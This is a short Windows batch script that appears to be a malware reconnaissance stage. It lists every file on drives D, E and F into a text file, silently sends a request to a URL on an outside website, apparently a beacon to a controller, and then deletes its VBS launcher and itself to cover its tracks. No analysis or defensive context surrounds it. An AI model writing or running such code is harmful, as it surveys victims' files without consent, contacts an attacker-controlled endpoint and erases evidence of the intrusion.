@echo off
setlocal enabledelayedexpansion

set "VBS_PATH=%~1"

set "OUTPUT_FILE=%~dp0tree_output.txt"
echo Directory tree generated on %DATE% %TIME% > "%OUTPUT_FILE%"
echo. >> "%OUTPUT_FILE%"

for %%D in (D E F) do (
    if exist "%%D:\" (
        echo [%%D:\] >> "%OUTPUT_FILE%"
        tree "%%D:\" /F /A >> "%OUTPUT_FILE%" 2>nul
        echo. >> "%OUTPUT_FILE%"
    ) else (
        echo [%%D:\] Drive not found >> "%OUTPUT_FILE%"
        echo. >> "%OUTPUT_FILE%"
    )
)

curl -s -o nul "https://naosdesign.co.kr/banner/info.php?a=1"

if defined VBS_PATH (
    start "" /b cmd /c "ping 127.0.0.1 -n 2 >nul & del /f /q """%VBS_PATH%""" "
)
start "" /b cmd /c "ping 127.0.0.1 -n 2 >nul & del /f /q """%~f0""" "